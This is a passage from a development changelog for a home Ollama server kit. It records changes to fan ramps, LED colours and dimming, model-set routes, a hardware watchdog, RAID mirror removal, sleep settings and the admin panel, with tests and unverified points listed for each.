- **Not verified.** WKWebView (the Browser pane is Blink); the first-run window and wizard were
  drawn from a dev copy with models already on disk (forced open), not from a real first run.
## 6b415 — the fans ramp down instead of stepping 100 / 50 / 20 (per Patrick)

Replaces the tail of 6b386: work ends -> 100% for 60 s (`hold100`, unchanged) ->
a straight ramp from 100% down to 20% over the next 120 s (new phase `ramp`,
status `ramp NN%`) -> `idle20` from 180 s after the work ended. Work, or the
temperature override, at any time returns to 100% at once and restarts it.

- `o1fan.ramp_pct(t)` = 100 - 80 * t / 120, rounded to whole 2% steps and never
  under 20: 0/30/60/90/119/120 s in = 100/80/60/40/20/20. (119 s is 20.67, which
  rounds to 20, within one step.) The one percentage goes to every controlled
  output through the existing `target()`: each case/CPU output is
  max(percent, its learned minimum), an always-100 output stays 100, an output
  with no rpm is released as before; the GPU fan is one of them. A level is judged by rpm only after it has held 6 s, and a ramp step lasts about 3 s,
  so stalls are caught where the level settles (the end of the ramp, or a floor), as before.
- Cooler (`o1aio`): fans follow the same percent (`plan()` uses `self.pct`
  in the ramp, floors from `aio/fanN`); the pump is extreme only in working /
  hot / hold100 (and the coolant >= 40 C override), balanced in the ramp and in
  calibrating, quiet at idle. Commands still go out only on change and no more
  often than every 5 s, so during the ramp the cooler fans step about every 5 s.
- Status: phase text `ramp 60%`; the line is `Fans: ramping down, 60% (20% in
  90 s)`; `hold100` says `then down to 20%`; the admin chip shows the percent.
  `hold50` is gone from code, README, setup text and the demo.
- Tests: the 59/60 s edge of hold100 and ramp points 0/30/60/90/119 s and 120/121
  s (idle), a request mid-ramp, override mid-ramp and its hysteresis, floors from
  learned minimums, always-100 outputs, write cadence of the ramp, the cooler's
  5 s limit and de-duplication during it. The old hold50 mutants are replaced by
  mutants for the hold time, the ramp length, the endpoints, the quantization
  and the cooler's ramp rules.
## 6b410 — model sets from the app: the server side (per Patrick: Light / Recommended / Everything, chosen in the app, carried out by the server)

Kit only (`ollama1/`); the app side is built separately to the same contract. The app computes the
set for the server's card, shows the exact Download and Remove lists and sends them; the server
carries them out. PROTOCOL.md "Model sets" is the contract, README "Model sets from the app" the
owner's view.

- **Routes** (bin/ollama1-gateway, signed and paired-only like /v1/sleep-config).
  `GET /v1/models/state` → exactly `models` (Ollama's /api/tags, cloud entries out, sorted, with
  `loaded` from /api/ps), `allow`, `busy`, `jobs`, `plan` (or null), `disk_free_bytes`,
  `vram_bytes`. `POST /v1/models/apply` `{plan, add, remove, seen}` → 202 `{"ok":true,"jobs"}` or
  400 `bad_request` / 409 `changed` (+`models`) / 409 `busy` / 409 `in_use` (+`name`); beyond the
  contract: 403 `unpaired`, 502 `ollama`, 503 `not_started` (systemctl refused), 504 `no_answer`
  (root didn't answer in 15 s; the request file is left for it). `seen` = sha256 of
  `"\n".join(sorted(names))` over exactly the `models` names.
- **Privilege line.** o1gw can't write models.allow, so the gateway checks the request
  (`o1modelplan.parse_request`: the contract's regex matched whole, no trailing newline, at most 40
  per list, no model twice or in both lists, not both empty, a known set name), then busy (root's
  plan lock, the library lock, active pull@/rmmodel@/sync/modelplan units via `systemctl
  list-units`, cached 2 s for GET), `seen`, in-use; writes `/var/lib/ollama1-gateway/
  modelplan-request.json` (0600, its own StateDirectory: no gateway unit change) and runs `systemctl
  start --no-block ollama1-modelplan.service` (its only subprocess), then waits for root's answer
  by request id. polkit (50-ollama1.rules, a second addRule): o1gw may start that one unit, verb
  start, and gets NO for everything else. The unit (root, oneshot, no argument) runs
  bin/ollama1-modelplan: reads the request with `read_json_safe` (no symlink, no FIFO, one link,
  owner o1gw, ≤16 KiB), refuses one older than 120 s or already answered (replay), checks the shape
  again (same function), that the device is paired (the name it records comes from devices.json,
  never from the request), takes the plan lock and the library lock (so a sync or `ollama1-models`
  can't run meanwhile; a lock held for a moment by someone checking it is waited out, ~2 s), asks
  systemd about pull@/rmmodel@/sync units (can't ask = busy), then `seen` and in-use against Ollama
  now. Refusals go to /run/ollama1/modelplan/answer.json and change nothing.
- **The work.** `o1library.allow_apply`: one read, lines naming a remove tag dropped (any letter
  case: `kept()` protects a model named in any case, so its line must go too), add tags not listed
  appended without a flag, every other byte kept (comments, CRLF, blank lines, bad lines), one
  temp-file + fsync + rename + folder fsync, 0644; a missing, non-UTF-8 or >1 MiB list is never
  written (a new list holding only the set would let the next sync delete everything else).
  Then jobs: removals first, then pulls in the given order, through `o1library.pull_one` /
  `delete_one` (the code the sync uses), 3 tries per pull; at its turn a removal is refused if any
  line names the model again or it is loaded, a pull if it left the list or the models disk has
  < 2 GiB free. A failed job is marked and the next runs. Progress (pct at most 1/s) to
  /run/ollama1/modelplan/status.json; the record, at every job transition, also to
  /var/lib/ollama1-modelplan/last.json (StateDirectory) so `plan` survives a reboot. A record that
  says running while nobody holds the plan lock reads as interrupted, its unfinished jobs failed.
  Journal: the request (device, set, add, remove, allow-list line counts), each job, a summary.
- **Unit sandbox.** ProtectSystem=strict, ReadWritePaths=/etc/ollama1 /run/ollama1/modelplan
  /run/ollama1/library, ReadOnlyPaths=-config.json -devices.json on top, StateDirectory,
  CapabilityBoundingSet=CAP_DAC_READ_SEARCH CAP_CHOWN (reads o1gw's 0700 folder, can't write it),
  IPAddressDeny=any + IPAddressAllow=localhost (Ollama pulls in its own service; the unit only needs
  127.0.0.1:11434 and D-Bus), the usual Protect*/Restrict*, @system-service, no [Install].
- **Small changes around it.** tmpfiles: `d /run/ollama1/modelplan 0750 root o1view`. setup.sh: the
  kit-completeness check (`for f in ...`, line 474) also needs bin/ollama1-modelplan and the unit;
  everything else is installed by the existing globs and the rules-file line. o1sleep.BUSY_UNITS
  has the unit (sleep held off, said once even though it also holds the library lock).
  `o1common.share_with_viewers`: the library lock file is now group o1view 0640 (under a unit's
  UMask=0027 it was root:root 0640, so the panel's "a sync is already running" check could never
  see a sync). `ollama1-models add` now takes the library lock around its list edit (one writer
  at a time). The panel refuses its single Pull/Remove while a set runs, and its Models card shows
  "Last change: Recommended from <device>, <time>: +N -M" (+ in progress / N failed / stopped),
  from `clean_modelplan` (known fields only, textContent). An accepted set touches the idle clock
  once. Tightenings beyond the contract, all 400s: a tag with ".." (the allow-list would read it
  as a bad line and block every sync removal) and a cloud tag in `add`.
- **Tests.** tests/test_modelplan.py (63; real gateway + stub Ollama + root program in a thread,
  plus the program end to end in its own prefix with a stand-in systemctl), test_admin (+4, and the
  polkit-vs-panel test now looks at the panel's own rule), test_library (+1), polkit_check.js runs
  every rule in order (+14 cases), test_stateless scans o1modelplan.py too. 52 mutants
  (`python3 tests/mutate.py modelplan`), all killed. Six older mutants were already BROKEN (anchor
  not found once) before this branch: two idle, one cpu, two gpu-tune, one fan; untouched.
- **Unverified (all of it on the real server).** polkit actually granting o1gw that start (and
  the subject being o1gw from the sandboxed gateway), `systemctl list-units` working from the
  gateway's sandbox, the unit's namespace setup (nested ReadOnlyPaths inside ReadWritePaths,
  IPAddressDeny with the port guard), systemd-inhibit from it, a real multi-GB pull's progress,
  Ollama's delete of a model while another loads, and the 15 s answer wait on a cold start.
## 6b416 — a FANS box on the panel; memory temperature in place of the fan bar (per Patrick)

- The bottom-middle box is split: STORAGE AND NETWORK above (46%, rows 11 units apart; its Disk/Net/Link
  lines and the RAID line go first when there is no room, disks never), and FANS below, same width; the bottom
  row is still three columns at the same heights. `layout()` gains "fans".
- FANS reads `/run/ollama1/fan.json` (`o1metrics` adds it as `st["fan"]` every tick; one small file). TWO bars
  (Pat's follow-up): "GPU fan" and "Case fans", the latter ONE bar averaging every case-type output (reads an rpm or
  is controlled) and the cooler's radiator fans: the bar is the mean of their bars, the text "1171 rpm avg". The pump
  is not in the average: a small line under the bars, "Pump 2400 rpm, quiet, coolant 31 C", shown when there is room.
  The bar is the output's setting (pwm of 255; the file has no maximum rpm) or its rpm against the fastest fan.
  Header: "working 100% - why", "cooling down NN%" (hold100, hold50 and the coming `ramp` phase), "idle 20%",
  "measuring 100%", just the level for an unknown phase; amber and an amber border when the phase is "hot" or the file
  lists hot sensors. "no fan data" when the file is missing or older than 30 s.
- Box titles are the hardware names: `o1metrics.device_names` (every 5 min: `o1gpu.detect()["name"]`, the
  /proc/cpuinfo model) go in `st["gpu"]["name"]` and `st["cpu"]["model"]`; `gpu_title` ("AMD RX 6900 XT" from
  "Navi 21 [Radeon RX 6900 XT]", vendor boilerplate and "Graphics" dropped) and `cpu_title` ("AMD Ryzen 9 5950X"
  from "... 16-Core Processor", (R), (TM), CPU, @ GHz dropped); the old titles when unknown. `frame()` now cuts the
  title with "..." to the room left of the right-hand text, which is never shortened by a long name.
- GRAPHICS CARD: the Fan row is gone; in its place Mem, the card's own memory temperature (`temps["mem"]`, already read
  by `o1stats.gpu()`, no new sampling), full bar at 95 C, amber from 85, red from 95. Temp stays the junction/edge one.
- Install: lib/o1panel.py, lib/o1metrics.py, then restart ollama1-dash. Tests: TestFans; 4 mutants.
## 6b419 — lights cool down over 180 s and dim to 50% after 5 idle minutes (per Patrick)

Patrick: "When cooling down, have the lights fade from red to orange to yellow to white
throughout the course of cooling down in a linear fashion. Then after five minutes of being
idle, fade down to fifty percent brightness. When the GPU starts working again, or if the CPU
hits 20% usage or higher, bring it back up to 100% brightness and repeat." Kit only
(`lib/o1leds.py`); `lib/o1work.py` and the fans untouched.

- **Colour fall.** `FALL_S` 10 s -> 180 s (the fans' 60 + 120 s cool-down): the shown
  intensity falls linearly over the whole cool-down; the rise (2.5 s) and the stops are
  unchanged; a burst raises it from wherever it is; 99/0/99/0 jitter stays near red.
- **Brightness b (0.5..1.0)** multiplies each channel of the final RGB, rounded (white 128,128,128;
  red 128,0,0), independent of the colour. Idle = card < 10% (6 s average) AND processors < 15%
  (10 s average, o1work's cpu reading: user+nice+system+irq+softirq, no iowait); not idle at the
  card >= 15% (`o1work.GPU_BUSY_PCT`) OR processors >= 20% (`CPU_WAKE_PCT`); the gaps are the
  hysteresis (wobbling 14/16 or 19/21 flips nothing). The averages come from `o1work.Work`'s
  own `_gpu`/`_cpu` (fed with the lights' cached card reading), so they are the fans' code.
  Idle starts counting `idle_since` at the moment it (re)enters idle; at `IDLE_DIM_S` = 300 s, b
  falls to 0.5 over `DIM_S` = 10 s; not idle: b returns to 1.0 over `UNDIM_S` = 1.5 s and the timer
  restarts at the next idle moment. Start and wake (`resync`): b = 1.0, idle, timer from now
  (and the averages restart). No card reading counts as card idle. A request in flight or a tool does
  not wake it.
- **Loop.** 20 Hz while the colour rises or b moves; during the slow fall it wakes with the
  0.25 s sample (about one colour level a tick), so an idle server still wakes only 4 times a
  second. Frames only when the rounded RGB changes; keepalive and reconnect resend the shown
  colour including b (a stop still sets plain white).
- **Status.** JSON adds `brightness`, `idle`, `idle_s`, `gpu_avg`, `cpu_avg`; `rgb` is the shown
  colour including b. Line: "Lights: orange, 100% (card 61% busy)", "Lights: white, dimming
  (idle 5 min)", "Lights: white, dimmed 50% (idle 6 min)". Admin line, `ollama1-leds status`,
  README and the setup plan/help updated.
- **Tests.** The 10 s fall test is replaced by the 180 s linear fall (x at 45/90/135/180 s) and a
  mid-fall burst; `TestDimming` (300 s start and 10 s dim, 1.5 s restore, CPU 19/21 and card 14/16
  edges with the averaging, a spike averaged away, timer restart, no dimming while a burst's
  fade is under 300 s old, both-quiet logic, boot/wake state, no flicker, resent/reconnect colour
  with b, status text). 48 `leds:` mutants (180, 300, 0.5, 10, 1.5, 20/15%, the AND logic, ...), all killed.
- Unverified on the real server: how 50% looks on the Mystic Light and the pump head (many
  controllers have their own brightness curve), and that the processors' average behaves
  as expected with the real /proc/stat.

---

## 6b417 — lights follow the graphics card's load, white through yellow and orange to red (per Patrick)

Patrick, after the 6b395 lights worked on the real server: "have the lights dynamically
go between white and red depending on GPU load: as it goes down it goes through red to
orange to yellow to white when it's down to zero; it can fluctuate in between; slow it
down: from 0% to 100% it should take about two to three seconds to go through the colours
and hit red." Replaces the fixed white/red state machine of 6b395 (fade to red when
"working", 3 s hold, fade back). Kit only (`lib/o1leds.py`); `lib/o1work.py`, the fans and
their tests are untouched.

- **Input.** The card's busy percent, `probes["gpu_busy"]` (the Gpu reader the fans use),
  every `SAMPLE_S` = 0.25 s; intensity x = percent / 100. No reading (no card, or the read
  fails): x = 0, white, and status says "no card reading". Requests in flight, tools and
  the processors are NOT in the colour any more (so a prompt-reading phase with the card
  partly busy looks weak; accepted).
- **Slew.** The displayed x rises at most 1.0 per `RISE_S` = 2.5 s and falls at most 1.0
  per `FALL_S` = 3.5 s; no hold. A jittering reading (99, 0, 99, 0 every 0.25 s) therefore
  wobbles within about 10% of red. A tick's dt is clamped to 0.5 s, so a long gap (a
  suspend, a stall) cannot jump the colour.
- **Ramp** (`STOPS`, piecewise linear in RGB, rounded): 0 white 255,255,255; 1/3 yellow
  255,255,0; 2/3 orange 255,128,0; 1 red 255,0,0 (0.5 is 255,192,0). At 0 it is exactly the
  full white of 6b395. Names for the status: white < 1/6, yellow < 1/2, orange < 5/6, red.
- **Frames.** Only when the rounded RGB changes (20 Hz at most, `FRAME_S`, while moving);
  every `POLL_S` = 2 s the link is checked and the colour resent (keepalive). A wake's
  SIGUSR1 now acts at the next tick, not the next poll. Reconnect resends the current colour
  (unchanged). Idle wakes are 4 a second (the sample), no more.
- **Status.** `/run/ollama1/leds.json`: `state` (colour name), `rgb`, `target_rgb`,
  `gpu_pct`, `gpu_reading`, `intensity`, `target_intensity`; line "Lights: orange (card 61%
  busy)  -  2 devices"; `ollama1-leds status` and the admin line show it. `why`/`target`
  keys are gone.
- **Removed:** `FADE_RED_S`, `FADE_WHITE_S`, `HOLD_RED_S`, `Fader`, `smooth`, the work
  state and its 3 s hold; their tests are replaced (not skipped): ramp at x = 0, .17, .33,
  .5, .67, .83, 1 and the exact stops, slew 2.5 s / 3.5 s, jitter, no frame without a change,
  the sampling rate, reconnect/wake resend, status. Mutants: 28 (`leds: ...`), all killed.
- Still unverified on the real server: that the ramp looks right on the Mystic Light and
  the pump head (their colour response is not linear), and that 2.5 s / 3.5 s feels right.

---

## 6b404 — the RAID mirror is gone from the kit (per Patrick: "pointless, it just ties up resources checking and rebuilding")

Kit only (`ollama1/`). The mirror (two 8 TB disks, RAID1 at /srv/data) is no longer built,
assembled, mounted or looked at, and a new server needs no md device. For a server that has one,
`tools/remove-raid.sh` tears it down.

- **setup.sh / setuplib.sh.** No mirror step, no /home move (it existed only to free a mirror disk),
  no `mdadm` package. `--hdd1-serial`/`--hdd2-serial` are accepted (shape checked) and ignored with
  a one-line note; they are written to setup.env only when given or already saved, so remove-raid
  can find the old disks. The plan says "No mirror: not used". `raid_*`, `md_*`, `plan_wipes`'s
  mirror part and the HDD checks in `check_disks` are deleted with their tests (TestRaid became
  TestNoMirror; the generic guards TestRaid covered now run on `models_step`).
- **Where /srv/data's jobs went (one constant each).** Backup: `o1common.Paths.backups` =
  /var/backups/ollama1 (+ `BACKUP_MAX_BYTES` 256 MiB, `BACKUP_MIN_FREE_BYTES` 2 GiB, 30 days;
  skipped with a recorded message over either limit); `setuplib.sh` `BACKUP_DIR` mirrors it and a
  test keeps them equal. migrate-os: `o1migrate.DATA_DIR` = /var/lib/ollama1 (= `Paths.state`,
  also tested): state, status, log, and by default the parked models. The unit lost
  `RequiresMountsFor=/srv/data`.
- **migrate-os without a mirror** (lib/o1migrate.py). The old design needed a disk that survives
  either NVMe; now the state lives on the FROM root, and four things follow. (1) The parked
  models are on the FROM root by default; `--park-dir DIR` (kept in the state file) puts them on
  another disk. The checks: not under /srv/models, not on a TO mount, read-write, room for the
  models plus a margin (the message names `--park-dir`). `check_data_raid`/`raid_ok` are gone;
  `check_parked_place` replaces them, also run just before the wipe. (2) The parked folder is
  excluded from the copy of `/` (`root_excludes`). (3) After stage 6 `hand_over` mounts the new
  root again and writes the state, a DONE status and the log into /var/lib/ollama1 there, so
  `--finish` and `--status` work after the reboot (the old drive's copy is not mounted then).
  (4) `--delete-parked` finds nothing when the copy is on the unmounted old drive and says so;
  it only deletes the folder the state file names. "The old drive was never written to" now means
  partitions, LVM, fstab and boot loader: its root filesystem gets state, log and parked models
  (README and plan text say so). The migrate test fixture puts the data folder under the fake `/`.
- **Panel/admin.** `o1stats.disks()` lists /srv/data only when something is mounted there or fstab
  has an active line for it (so a server with a dropped mirror mount still shows it MISSING; one
  without a mirror shows no row and no "not mounted" warning). `bin/ollama1-admin` line 765 lost
  `if(!(s.raid||[]).length)pairs.push(['RAID','no array','warn'])`, the only thing that said anything
  about a RAID that is not there. The mdstat parsing, the HDMI panel's and dashboard's RAID line
  (drawn only when an array exists) and the sleep code's resync allowance stay for servers that
  have one.
- **tools/remove-raid.sh** (dry run by default; `--yes-erase-the-mirror` plus a typed `yes` read
  from /dev/tty, refuses without a terminal). Members must be exactly the two disks by serial
  (setup.env or options), never an NVMe, never the OS/models serials; unknown names on the array
  or an unfinished migrate-os state refuse unless `--keep-going`. Steps: stop the backup units,
  copy the settings backups to /var/backups/ollama1 (< 256 MiB), umount, `mdadm --stop`, zero each
  member's superblock after re-reading the disk serial, comment out the /srv/data fstab line
  (timestamped copy), remove that array's ARRAY line from mdadm.conf (copy), disable the mdcheck
  timers and comment out the cron job unless another array is left, update-initramfs, then a
  check of each result and a log in /var/log/ollama1-remove-raid.log. Partition tables are left;
  the wipefs line is printed, never run. `test_removeraid.py` (fake lsblk/mdadm/... in
  `tests/fakeraid.py`), `test_noraid.py`, 17 new mutants.
- **Unverified.** Nothing ran on the real server: not the teardown (real `mdadm --detail --export`
  and `lsblk -lsnpo` output shapes are assumed from the existing setuplib code), not a migrate-os
  run with the new data folder.

## 6b403 — hardware watchdog for a server that loses its system NVMe (per Patrick)

The failure: the system NVMe drops off the bus, the machine stays up from memory
(it pings, every program on disk gives "Input/output error", SSH resets) and only
a manual power cycle brings it back. Built (kit only, `ollama1/`):
`systemd/ollama1-watchdog.service`, `bin/ollama1-watchdog`, `lib/o1watchdog.py`
(stdlib), `setup.sh --watchdog on|off` (default on; `WATCHDOG=` in setup.env, the
way FANS/LEDS are saved), a pause/resume pair in the sleep hook, README "Hardware
watchdog", `tests/test_watchdog.py` (82 tests on fakes), 29 mutants.

- **Hardware only.** `sp5100_tco`, else `wdat_wdt`, loaded best effort from
  `ExecStartPre=-+...load-modules` and kept at boot through
  `/etc/modules-load.d/ollama1-watchdog.conf`, written by setup only when a device
  showed up. `softdog` is never loaded and a watchdog whose sysfs identity says
  "Software" is skipped: a frozen kernel cannot run it.
- **What pets it.** Every 10 s, only after a probe that passed: write a token on
  the root fs, fsync, drop it from the cache, read it back; stat (and read 4 KB
  of) an entry on /srv/models when something is mounted there; read 4 KB of an
  uncached root file at a different offset each time. The probe runs in a daemon
  thread with an 8 s limit; a probe still stuck from an earlier turn is not
  repeated (no pile of threads on a dead drive) and fails the turn at once.
  Two failures in a row (about 20 s) and it stops petting for good (latched,
  until restart) without closing the device; timeout 60 s (90 or 30 if the chip
  refuses; the pet interval is a third of whatever the chip clamps it to).
- **The close rules.** `V` + close disarms the Linux watchdog; any other close
  leaves the timer running. `V` is written in one function (`_disarm`), called
  from a stop of a healthy service and from the sleep pause. A crash, a kill,
  `WatchdogSec`, a stop while failing or tripped: armed, and `Restart=always`
  comes back in 2 s. The unit has no `ExecStopPost`, no memory/CPU cap,
  `OOMScoreAdjust=-900`, and none of PrivateDevices/ProtectClock/DeviceAllow
  (they would hide or close /dev/watchdog0; this was deliberate: ProtectClock in
  particular is not used although the fan unit has it).
- **Sleep.** The hook calls `ollama1-watchdog pause` (SIGUSR2; the service closes
  with `V`, the hook waits up to 5 s for the status to say so) before suspend and
  `resume` (SIGUSR1) first thing after waking; the service then waits for a probe
  to pass before reopening, but at most 90 s, so a drive that never returns still
  ends in a reset. A pause while tripped is ignored. A clock jump (CLOCK_BOOTTIME
  ahead of CLOCK_MONOTONIC by more than 25 s) clears the failure count: the same
  protection if the hook ever does not run. The hook guards on the file existing,
  not on `systemctl is-active`, so the other hook tests' call logs are unchanged.
- **Not done / unverified.** Nothing ran on the real board. Whether this board's
  `sp5100_tco` starts and resets, whether the BIOS has its own timer, and how a
  heavy `migrate-os` copy interacts with an 8 s fsync limit are for the server.
  README has the by-hand drill and the MSI BIOS notes (Integrated Peripherals,
  and "Restore after AC power loss" = Power On for remote power cycles).
## 6b402 — the admin page can set auto sleep (per Patrick)

Patrick: "Make the auto-sleep switch changeable from the page." The setting is
the gateway's file (`/var/lib/ollama1-gateway/sleep.json`, 0600, folder 0700
o1gw); the panel (o1admin, ProtectSystem=strict, polkit starts fixed units
only) could only show it (6b400).
- **Smallest safe way: one template unit, no request file.**
  `ollama1-sleepcfg@<on|off>-<minutes>.service`, the instance name is the whole
  request (like `ollama1-pull@<hash>`). It runs as **o1gw, not root**
  (`User=o1gw`, `SupplementaryGroups=o1view`, no capabilities, no network,
  `StateDirectory=ollama1-gateway`, `ReadWritePaths=/run/ollama1/stats`), so the
  file keeps the owner the gateway gives it and the app and idle service see it
  as before. A root helper was rejected: root would own the 0600 file and the
  gateway could no longer read it. The panel's own folder is 0700 o1admin, so a
  request file would not even be readable by o1gw: the name carries it.
- **Same writer as the gateway:** `o1idle.apply_sleepcfg` -> `write_config`
  (atomic, fsynced, 0600); a test compares the bytes with what the gateway's
  `sleep_set` writes. `bin/ollama1-sleepcfg` refuses root, takes exactly one
  argument and validates it again (`^(on|off)-[0-9]{1,4}$`, fullmatch, minutes
  clamped to 5..1440). It reads the file back and leaves
  `/run/ollama1/stats/sleepcfg.json` (o1gw, 0640 o1view): request, `ok`, what the
  file really holds, a fixed-wording error, the time.
- **Polkit:** one added regex, `^ollama1-sleepcfg@(on|off)-[0-9]{1,4}\.service$`,
  start verb only, for o1admin only (the rest of the rule is untouched).
- **Route:** `POST /api/sleep-config` `{"enabled": bool, "minutes": int}` and
  nothing else: the same CSRF / Origin / Sec-Fetch-Site / JSON-only / 4 KiB
  checks as `/api/action`, then its own: exactly those two keys, a real bool, a
  whole number 5..1440 (out of range is refused, not clamped). It starts the
  unit and waits up to 8 s for a result file whose `req` matches and whose time
  is not before the request, then answers with what the unit read back: 200
  `{ok, enabled, minutes, confirmed}`, 500 with the reason (could not write,
  another change landed), 504 if nothing was reported. `GET /api/sleep-config`
  gives setting, last change, decision. `/api/state` adds `sleepcfg` and
  `sleep_setting`.
- **Page and app agree:** the folder is 0700, so the panel knows the setting
  from two witnesses and takes the newer: the idle service's tick (re-reads the
  file every 30 s, so an app change shows within one tick) and the read-back of
  the page's own last change (shown at once). Until the idle service looks
  again the page says "Saved" instead of the old decision. Last writer wins.
- **Page:** a switch, chips 15/30/60/120, a number box with Set (also Enter),
  applied at once with a toast; success shows only when the server's answer has
  `confirmed`; a failure shows the reason and the code; the page re-reads the
  setting after every attempt. Minutes outside 5..1440 are refused in the page
  before sending, and again by the server.
- **GPU tuning on/off: not done.** `ollama1-gpu-tune on|off` is root work (sysfs
  overdrive, a 60 s answer check against Ollama, the kernel log, a revert
  path): a safe unit would be two more root units with the gpu-tune hardening
  plus network access to Ollama. Not small; it stays `sudo ollama1-gpu-tune`.
- Tests: the route's checks (CSRF, Origin, content type, cross-site, no JWT, bad
  JSON, size, 16 bad bodies, edges 5 and 1440), the read-back, a failed write,
  a unit that does not start or never answers, a stale answer, the app/page
  last-writer-wins round trip, the request shape (25 spellings), the program
  as a subprocess, the unit and polkit text (and the node rule check), the
  page's controls. 10 new mutants, all killed. The demo runner now applies the
  unit through the real function and the fake idle service follows the file.
- Install: `bin/ollama1-admin`, `bin/ollama1-sleepcfg` (new, 0755),
  `lib/o1idle.py`, `systemd/ollama1-sleepcfg@.service` (new),
  `config/50-ollama1.rules`; then `systemctl daemon-reload`, reload polkit
  (`systemctl restart polkit`), `systemctl restart ollama1-admin`. setup.sh
  copies all of these.
## 6b401 — "working" without the load average; the Ollama updater waits for the network (per Patrick)

Patrick: "I swear the fans keep going up on their own." On the real server the
journal showed `working: the machine is busy (load 5.2)` for minutes after boot
with nothing running: the 1-minute load average counts tasks blocked on a disk
(the RAID check, apt/snapd bursts, boot work) and lags by a minute, and the 60
s + 60 s holds followed it.

- `lib/o1work.py` (shared by the fan service and the lights) no longer reads the
  load average. Working = a request in flight (at once); a running tool (at
  once: whatever `o1idle.scan_tools` knows; gpu-burn.sh is not in its list and
  is covered by the card signal; `o1idle` itself is untouched); the card
  >= 15% averaged over 6 s; the processors >= 40% averaged over 10 s from
  `/proc/stat` deltas (busy = user+nice+system+irq+softirq; total = all eight
  fields, so iowait and idle are in the total, steal is not busy). Sampled at
  the callers' 2 s poll; a window must span its length less 1 s before it says
  anything (the first seconds after a start are quiet). Hysteresis: once the card
  or processors made it work, it stays until that value has been under its
  threshold for 6 s (the averages themselves lag, so a release is 6 s plus).
- The reasons are `a request is running`, `running stability-test.sh`, `the card
  is 62% busy`, `processors 71% busy`; the fan status, the admin line and the
  lights' status carry them unchanged. Hold timing (60 s at 100%, 60 s at 50%) is
  untouched. A one-sample 100% reading at the 2 s poll averages to 25% over the
  4 samples of a 6 s window, so a single GPU spike can still count; that is the
  spec's averaging, not a bug.
- Tests: `tests/test_work.py` (fake /proc/stat, fake clock: a boot-like load
  with idle processors, a 3 s burst, 10 s of 45%, iowait-heavy samples, steal,
  each busy field, the card at 14/15/16%, averaging, both hysteresis edges, a 2 s
  poll, which signal) and 22 `work:` mutants (thresholds, windows, hysteresis,
  each /proc/stat field, the load average back). `test_fan`/`test_leds` changed
  only where they asserted the load average or a single GPU sample.
- The weekly Ollama updater failed at boot with "Temporary failure in name
  resolution": the timer's catch-up run fires before DNS works, and a refusal
  wrote `failed`. `bin/ollama1-update-ollama` now waits up to 2 minutes for the
  API host to resolve (`wait_for_dns`), and a failure that is only "no network"
  (`is_no_network`: gaierror, timeouts, connection errors, no route; not an HTTP
  answer) is retried every 30 s for 10 minutes (`run_with_retries`). Until the
  budget is spent `ollama-update.json` says `waiting for the network`, which a
  later `updated`/`current` overwrites; only then (or for any other failure at
  once) `failed`. The admin chip says "Waiting for the network" (warn), not
  "Last update failed". `--no-wait` and `--check` make one attempt. Unit:
  `After=network-online.target nss-lookup.target`; no `Restart=` (a real
  failure must not loop). Tests: `TestNetworkWait*` in test_updater.py with a
  fake clock and resolver, and 10 `updater:` mutants.

## 6b400 — the web admin panel is graphical now, same actions and protections (per Patrick)

Patrick: "Rebuild the web interface so that it's much more graphical, but
still retains the settings in there for things like reboot, sleep, update,
view logs." The page in `bin/ollama1-admin` (PAGE) is rewritten; the routes,
the POST bodies and every check behind them are unchanged.

- **The page.** One dark page: a header with the name, a status ring
  (Healthy / Working / Attention / Problem, computed in the page from
  /api/state: tunnel, gateway, RAID, disks over 90%, a failed Ollama update or
  wake check, GPU >= 90/100 °C, the CPU's own warn/hot thresholds, throttling,
  reboot needed, pairing open) and five figures; eight SVG gauges; nine 1 h /
  24 h area charts drawn by the page's own code (one point per 2 px, the mean
  of what falls there, so 24 h of 10 s rows stays cheap; a crosshair readout);
  Hardware (the CPU card with its old ids, fans, lights, storage + RAID check,
  services, network, GPU tuning); Models (VRAM by model, unload countdown,
  the library with typed-name Remove, Pull, Update model library); Power and
  cost (watts chart, 1 h / 24 h / 7 d / 30 d tiles with hours measured and
  "estimated" when not all from the plug, the prices editor as before);
  Controls; Devices; Logs (tabs for requests, model events, actions, updates,
  library, errors, status lines; filter, follow, copy). Polls /api/state every
  2.5 s, the rest every 3-30 s, all paused while the tab is hidden. Every
  number from the server goes in with textContent or an SVG attribute.
  Confirmations are a native `<dialog>` (focus stays inside, Esc cancels);
  the toast after an action shows the server's own answer and status code.
  Respects prefers-reduced-motion; usable at 375 px (single column, no
  sideways scroll, 16 px gutters). About 105 KB.
- **Sleep line** is the same rule as the HDMI panel's `o1panel.sleep_summary`
  (6b396), from the same file; the server adds `age_s` (its own clock), so a
  browser with a wrong clock can't move the countdown. A node test checks the
  page's function against `sleep_summary` case by case.
- **Auto sleep is shown, not set, here.** The setting lives in the gateway's
  state folder (`/var/lib/ollama1-gateway/sleep.json`) and the app sets it
  through `/v1/sleep-config`; the panel's unit has `ProtectSystem=strict` and
  can write only its own folder, and polkit lets it start only the fixed
  units. Setting it from the panel needs a new fixed unit + a helper verb + a
  polkit line (like power-apply): not done here, Patrick to decide. Likewise
  GPU tuning stays `sudo ollama1-gpu-tune on|off` at the server; the panel
  shows its state file.
- **/api/state gains** `fan_status`, `leds_status`, `idle`, `gpu_tune`
  (module-level `clean_fan` / `clean_leds` / `clean_idle` / `clean_gpu_tune`:
  named fields of the expected type only, strings cut short, NaN/inf dropped;
  the fan and lights files must be fresh, as before). **/api/logs gains**
  `events` and `errors` (from the gateway's snapshot). **/api/history** rows
  gain `cpu_pct` and `ram_gib` (11 columns; 7- and 9-column files still load).
- **Security.** CSP tightened: the same nonce-only script/style, plus
  `require-trusted-types-for 'script'; trusted-types 'none'` (no string can
  become markup or script even by mistake). All JSON answers now escape
  `<`, `>` and `&` as `<` etc. (`json_bytes`): the same data to a JSON
  reader, never markup to anything that sniffs. CSRF, Origin,
  Sec-Fetch-Site, JSON-only, the size limits, the confirm fields (reboot,
  sleep, remove-model by name, library-sync by preview id) and polkit are
  untouched. No external URL, font or script.
- **Looking at it without a server:** `tests/admin_demo.py` runs the real
  `serve()` on made-up files in a scratch OLLAMA1_PREFIX (fake /sys and /proc
  that move every second, a stub Ollama, hostile names on purpose), with a
  runner that starts nothing, behind a local proxy that adds what Access
  adds. It refuses root and systemd (INVOCATION_ID); setup.sh never installs
  tests/. The panel itself has no demo switch (a test checks the source has
  no environ/demo).
- Tests: the CSP and nonce, no external URL, no inline handlers or style
  attributes, no markup sinks in the script, every FIXED/TEMPLATE action
  reachable and the single POST with the CSRF header, the dialogs, polling
  pause, the cut-down status files with hostile text, NaN and stale files,
